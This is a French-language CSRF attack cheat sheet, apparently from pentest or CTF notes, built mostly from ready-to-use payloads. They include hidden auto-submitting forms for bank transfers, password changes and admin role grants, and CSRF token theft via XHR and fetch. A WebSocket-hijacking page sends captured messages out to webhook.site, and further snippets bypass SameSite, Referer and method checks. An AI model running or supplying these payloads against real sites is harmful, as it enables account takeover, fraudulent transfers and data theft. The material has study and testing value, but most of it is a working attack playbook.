# CSRF et Attaques Cross-Site

## &#x20;<mark style="color:red;">CSRF et Attaques Cross-Site</mark>

### <mark style="color:blue;">🎯 Méthodologie Générale CSRF</mark>

#### 1. Reconnaissance

* **Analyser les protections** : Tokens CSRF, SameSite cookies, headers Referer/Origin
* **Identifier les actions sensibles** : Changement de mot de passe, transferts, validation de comptes
* **Tester les méthodes HTTP** : GET/POST acceptées, override de méthodes
* **Chercher les points d'injection** : Pages de contact, commentaires, profils

#### 2. Vecteurs d'attaque

* **Formulaires cachés** dans emails/pages web
* **Balises img/script** pour requêtes GET
* **WebSocket hijacking** si pas de protection origine
* **Injection via contact/support** pour cibler les admins

### <mark style="color:blue;">🚨 Types d'Attaques CSRF</mark>

#### 1. CSRF Basique (Sans Protection)

**Contexte** : Aucun token, pas de vérification Origin/Referer

```html
<!-- Via formulaire caché -->
<form action="https://bank.com/transfer" method="POST" style="display:none">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="toAccount" value="attacker">
</form>
<script>document.forms[0].submit();</script>

<!-- Via image (GET seulement) -->
<img src="https://bank.com/transfer?amount=1000&to=attacker" width="1" height="1">
```

#### 2. CSRF avec Token Stealing

**Contexte** : Token CSRF présent mais extractible

**Étape 1 - Récupération du token** :

```javascript
// Requête AJAX pour récupérer la page avec le token
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://target.com/profile", false);
xhr.send();

// Extraction du token (regex pour hash MD5 32 chars)
var token = xhr.responseText.match(/[abcdef0123456789]{32}/)[0];
```

**Étape 2 - Utilisation du token** :

```html
<form action="http://target.com/profile" method="post" name="csrf_form">
    <input type="text" name="username" value="attacker">
    <input type="checkbox" name="status" checked>
    <input type="hidden" name="token" value="" id="token"/>
</form>

<script>
// Injection du token volé
document.getElementById('token').setAttribute('value', token);
// Soumission automatique
document.csrf_form.submit();
</script>
```

#### 3. Cross-Site WebSocket Hijacking (CSWSH)

**Contexte** : WebSocket sans vérification d'origine

```html
<!DOCTYPE html>
<html>
<body>
<script>
    // Connexion au WebSocket avec les cookies de l'admin
    var ws = new WebSocket('ws://target.com:port/ws');
    
    // Réception des messages
    ws.onmessage = function(event) {
        // Exfiltration vers notre serveur
        fetch('https://webhook.site/xxx', {
            method: 'POST', 
            mode: 'no-cors', 
            body: event.data
        });
    };
    
    // Envoi de commandes
    ws.onopen = function() {
        ws.send("hello");           // Reconnaissance
        ws.send("Get the flag");    // Commande sensible
    };
</script>
</body>
</html>
```

#### 4. Bypass SameSite Lax

**Contexte** : Cookie `SameSite=Lax` contournable via GET

```html
<!-- Navigation top-level (GET) peut contourner SameSite=Lax -->
<script>
window.location = "https://target.com/sensitive-action?param=value";
</script>

<!-- Ou via iframe avec navigation -->
<iframe src="https://target.com/sensitive-get-endpoint?action=delete"></iframe>
```

### <mark style="color:blue;">🔧 Vecteurs d'Injection Spécifiques</mark>

#### Via Page de Contact

```html
<!-- Injecter dans le corps du message -->
<form action="http://target.com/admin/validate" method="post" style="display:none">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="approve" value="true">
</form>
<script>document.forms[0].submit();</script>
```

#### Via Profil/Commentaire

```html
<!-- Si le contenu est affiché aux admins -->
<img src="x" onerror="
var f=document.createElement('form');
f.action='http://target.com/admin/action';
f.method='POST';
f.innerHTML='<input name=param value=malicious>';
document.body.appendChild(f);
f.submit();
">
```

### <mark style="color:blue;">🛡️ Protections et Contournements</mark>

#### Protections Communes

| Protection          | Description                         | Contournement Possible      |
| ------------------- | ----------------------------------- | --------------------------- |
| **Token CSRF**      | Token unique par session/formulaire | Token stealing via XSS/AJAX |
| **SameSite Strict** | Cookie jamais envoyé cross-site     | Aucun contournement direct  |
| **SameSite Lax**    | Cookie envoyé sur navigation GET    | Requêtes GET malveillantes  |
| **Referer Check**   | Vérification header Referer         | Referer vide ou falsifié    |
| **Origin Check**    | Vérification header Origin          | Origin null ou bypass       |

#### Techniques de Contournement

**1. Bypass Referer/Origin**

```javascript
// Supprimer le referer
<meta name="referrer" content="no-referrer">

// Ou utiliser data: URL
data:text/html,<form action="http://target.com/action" method="post">...
```

**2. Method Override**

```html
<!-- Si le serveur accepte X-HTTP-Method-Override -->
<form action="http://target.com/action" method="GET">
    <input type="hidden" name="_method" value="POST">
    <!-- Ou via header avec fetch -->
</form>
```

**3. Extraction de Token**

```javascript
// Différentes façons d'extraire le token
// Regex générique pour tokens
var token = response.match(/name="csrf_token" value="([^"]+)"/)[1];

// Pour hash MD5 (32 chars hex)
var token = response.match(/[a-f0-9]{32}/)[0];

// XPath si structure complexe
var token = document.evaluate('//input[@name="csrf_token"]/@value', document).stringValue;
```

***

### <mark style="color:orange;">🎲 Payloads par Scénario</mark>

#### Activation de Compte Admin

```html
<!-- Formulaire d'activation automatique -->
<form action="http://target.com/admin/activate" method="post" style="display:none">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="status" value="active">
    <input type="hidden" name="role" value="admin">
</form>
<script>
setTimeout(() => document.forms[0].submit(), 1000);
</script>
```

#### Transfert d'Argent

```html
<form action="https://bank.com/transfer" method="post" style="display:none">
    <input type="hidden" name="from_account" value="victim">
    <input type="hidden" name="to_account" value="attacker">
    <input type="hidden" name="amount" value="999999">
</form>
<script>document.forms[0].submit();</script>
```

#### Changement de Mot de Passe

```html
<form action="http://target.com/change-password" method="post" style="display:none">
    <input type="hidden" name="current_password" value="">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```

***

### <mark style="color:red;">🔍 Checklist d'Attaque CSRF</mark>

#### Phase 1 : Reconnaissance

* \[ ] Identifier les actions sensibles (admin, transfert, etc.)
* \[ ] Analyser les protections (tokens, SameSite, headers)
* \[ ] Tester les méthodes HTTP acceptées
* \[ ] Chercher les points d'injection (contact, commentaires)

#### Phase 2 : Développement de l'Attaque

* \[ ] Choisir le vecteur approprié (formulaire, WebSocket, etc.)
* \[ ] Créer la payload adaptée aux protections
* \[ ] Tester localement le fonctionnement
* \[ ] Préparer l'endpoint de réception (webhook)

#### Phase 3 : Exploitation

* \[ ] Injecter la payload via le vecteur identifié
* \[ ] Attendre l'exécution par la cible (admin/bot)
* \[ ] Vérifier l'exécution de l'action
* \[ ] Récupérer le résultat (flag, accès, etc.)

***

### <mark style="color:red;">🌐 Outils et Techniques</mark>

#### Endpoints de Test

* **Webhook.site** : Réception de données WebSocket/HTTP
* **Burp Collaborator** : Détection d'interactions
* **RequestBin** : Capture de requêtes HTTP

#### Debugging WebSocket

```javascript
// Monitoring des messages WebSocket
var originalSend = WebSocket.prototype.send;
WebSocket.prototype.send = function(data) {
    console.log('WS Send:', data);
    return originalSend.call(this, data);
};
```

#### Extraction de DOM

```javascript
// Extraction de valeurs cachées
var hiddenInputs = document.querySelectorAll('input[type="hidden"]');
hiddenInputs.forEach(input => console.log(input.name, input.value));

// Extraction de tokens spécifiques
var csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
```

### 🚀 Patterns d'Exploitation Avancés

#### Auto-Submit avec Délai

```html
<form id="csrfForm" action="http://target.com/action" method="post" style="display:none">
    <!-- inputs cachés -->
</form>
<script>
// Attendre le chargement complet
window.onload = function() {
    setTimeout(() => {
        document.getElementById('csrfForm').submit();
    }, 2000); // Délai de 2 secondes
};
</script>
```

#### Chain Attack (Token + Action)

```javascript
// Étape 1: Récupérer le token
fetch('/profile')
    .then(response => response.text())
    .then(html => {
        // Étape 2: Extraire le token
        var token = html.match(/csrf_token" value="([^"]+)"/)[1];
        
        // Étape 3: Effectuer l'action avec le token
        var formData = new FormData();
        formData.append('csrf_token', token);
        formData.append('action', 'malicious');
        
        return fetch('/sensitive-action', {
            method: 'POST',
            body: formData
        });
    })
    .then(() => console.log('Attack completed'));
```

### ⚡ Points Clés à Retenir

1. **Toujours chercher les tokens CSRF** - Mais ils peuvent être volés via AJAX
2. **WebSocket = souvent pas de protection** - CSWSH très efficace
3. **SameSite Lax ≠ sécurité totale** - Contournements via GET possibles
4. **Page de contact = vecteur privilégié** - Cible directement les admins
5. **Chaîner les attaques** - Token stealing + CSRF pour bypass complet
6. **Timing important** - Délais pour chargement complet des pages

***

_💡 **Astuce finale** : En cas de protection forte, chercher des vulnérabilités XSS pour voler les tokens ou bypasser les protections côté client !_
